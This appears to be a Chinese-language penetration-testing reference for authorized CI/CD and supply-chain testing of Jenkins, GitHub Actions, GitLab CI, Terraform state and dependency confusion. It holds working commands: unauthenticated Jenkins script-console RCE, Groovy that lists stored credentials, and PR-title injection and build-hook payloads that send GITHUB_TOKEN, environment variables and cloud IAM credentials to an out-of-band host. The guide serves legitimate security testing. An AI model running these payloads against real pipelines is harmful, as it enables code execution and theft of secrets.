# CI/CD 与供应链参考（授权测试）

## 0. 先过“没有证据就不算”门

CI/CD 是误报重灾区。报告前逐条确认：

1. **登录页不是 RCE**。`/script` 返回登录页/403 只说明端点存在；必须 POST 后拿到命令输出。
2. **有 `pull_request_target` 不等于可注入**。必须证明不可信数据流进了执行 sink。
3. **盲注入必须 OOB**。用 Collaborator/interactsh 的唯一子域证明 runner 真的执行了。
4. **`.tfstate` 200 不等于凭据泄露**。解析后确认含 secret，并与基线对比。

## 1. Jenkins

### 1.1 指纹

```bash
curl -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
  echo "$p -> $(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET$p")"
done
```

`X-Jenkins` 头泄露精确版本，用于选 CVE。403/401 = 需要认证，不是未授权。

### 1.2 匿名 script console

只有 POST 返回输出才算：

```bash
curl -s -X POST "https://$TARGET/scriptText" \
  --data-urlencode 'script=println "id".execute().text'
```

返回 `uid=...(jenkins)` → 未授权 RCE。返回登录页/Crowd 错误页 → 不成立。

只读凭据面（验证到可读取即可，不导出真实值）：

```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import org.jenkinsci.plugins.plaincredentials.StringCredentials
def items = CredentialsProvider.lookupCredentials(
  StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null)
println items.collect { it.id + ":" + it.username }
```

### 1.3 CVE-2024-23897（CLI 任意文件读）

`/cli` 可达且版本受影响时，用 `jenkins-cli.jar` 的 `@/path` 读文件；错误回显包含内容。
目标文件：`/var/lib/jenkins/secret.key`、`secrets/master.key`、`credentials.xml`。
判真：文件内容出现在错误输出里。

### 1.4 其他

- 匿名 agent / JNLP 端口开放；
- 插件 CVE（Script Security、Git、Pipeline）；
- `/asynchPeople/`、`/securityRealm/user/` 用户枚举。

## 2. GitHub Actions

### 2.1 两类 sink，payload 不同

- **`${{ }}` 进 `run:`**：表达式在 shell 执行前替换，PR 标题/分支名/正文里的换行、反引号、
  `$(...)` 变成字面 shell。
- **环境变量在 shell 内**：`GITHUB_TOKEN`、`secrets.X` 是字符串值，用 `printenv`/`echo` 读取；
  `cat $VAR` 会把它当文件名。

```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # 检出攻击者代码
      - run: echo "Building PR ${{ github.event.pull_request.title }}"   # 注入点
```

PR 标题注入示例（只在自己仓库/授权仓库验证）：

```
a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.$COLLAB/?t=$T"; }; echo "
```

多行 `run:` 用换行注入更干净：

```
foo\n      curl https://x.$COLLAB/?d=$(printenv | base64 -w0)
```

### 2.2 污染 checkout（不需要 `${{ }}`）

`pull_request_target` 检出 PR head 后执行 `make`、`npm ci`、`.github/` 内 action、Makefile →
runner 直接执行攻击者代码。构建钩子里读环境：

```bash
curl -s "https://x.$COLLAB/?env=$(printenv | base64 -w0)"
cat /proc/self/environ | tr '\0' '\n' | base64 -w0
```

### 2.3 自托管 runner

公开仓库 + `runs-on: self-hosted`（或自定义 label）+ fork PR → 攻击者 job 跑在组织自己的机器。
非临时 runner 会跨 job 保留工具与凭据。验证：

```bash
whoami; hostname; id
curl -s "https://x.$COLLAB/?h=$(hostname)&u=$(whoami)"
curl -s "https://x.$COLLAB/imds=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
```

### 2.4 OIDC 信任策略

```bash
aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'
```

红旗：`token.actions.githubusercontent.com:sub` 缺失，或 `StringLike` 写成 `repo:ORG/*:*`。
证明：在组织内自己可控的 workflow 里 assume role，`aws sts get-caller-identity` 返回该角色。

### 2.5 Actions 缓存投毒

PR 可写缓存、主分支复用同一 key → 在依赖安装前投毒缓存。只在自有仓库验证。

## 3. 日志、制品与密钥

- 公开仓库日志常在 `::add-mask::` 生效前打印密钥；masker 只隐藏精确值，base64/拼接/派生形式
  会漏。
- 检查 debug 日志、`set -x`、环境 dump、失败步骤回显。
- artifact：`.env`、kubeconfig、docker config、测试凭据、构建产物内嵌密钥。
- 镜像层：后层删除的文件仍留在历史层。

```bash
# 只读检查镜像历史中的疑似密钥（自有镜像）
docker history --no-trunc <image> | grep -iE "secret|token|password|key"
```

判真：能读取明文或可解码的真实凭据；仅出现变量名不算。

## 4. GitLab CI

- Runner registration token 泄露 → 注册攻击者 runner 接 job（仅在自有实例验证，不注册到他人）。
- `.gitlab-ci.yml`：未 mask 变量、`CI_JOB_TOKEN` 权限过大、fork MR 触发特权 job
  （GitLab 版 pull_request_target）。
- 受保护分支/环境保护是否真的限制变量。
- 公开项目 pipeline 日志与 artifacts。

## 5. Terraform state

常见位置：

```
https://$TARGET/terraform.tfstate
https://$BUCKET.s3.amazonaws.com/terraform.tfstate
https://$TARGET/.terraform/terraform.tfstate
```

判真：JSON 可解析且含 `password`、`access_key`、`private_key`、连接串等；只有资源 ID/输出
不算。与基线对比，避免把公开只读 state 误报为凭据泄露。

## 6. 供应链

### 6.1 依赖混淆

条件：组织使用私有包名（`@org/pkg`、内部 npm/PyPI 名），且 registry 解析顺序可被外部包抢占。
验证边界：

- 只在自有 namespace / 自建 registry 复现解析优先级；
- 不向公共 registry 发布占用他人包名的测试包；
- 证明点是“安装时会解析到非预期源”，不是真的投毒成功。

### 6.2 包名抢注 / typosquatting

- 枚举组织公开依赖与内部包名；
- 检查相似名是否已被第三方注册（只读查询）；
- 不注册、不发布、不联系维护者。

### 6.3 维护者/构建链

- 依赖是否从 Git URL/分支安装（可被 force-push）；
- lockfile 是否固定 integrity；
- CI 是否对第三方 action 固定 SHA（`uses: org/action@<sha>`）。

## 7. 假阳性清单

- Jenkins `/script` 200 但返回登录页 → 不成立。
- `pull_request_target` 存在但无可控数据进 sink → 不成立。
- workflow “跑绿了”但没有 Collaborator 回连 → 不能证明代码执行。
- `.tfstate` 只含资源 ID → 不是凭据泄露。
- 日志里只有变量名/掩码 → 不是密钥泄露。
- 依赖相似名存在但未被解析 → 不是依赖混淆。

## 8. 证据清单

- 组件与版本指纹；
- 触发链：端点/工作流文件/PR/构建号；
- 执行证明：命令输出、OOB 回连、可解码 secret（脱敏）；
- 影响范围：能访问的凭据/环境/下游系统；
- 未成立分支与降级理由。
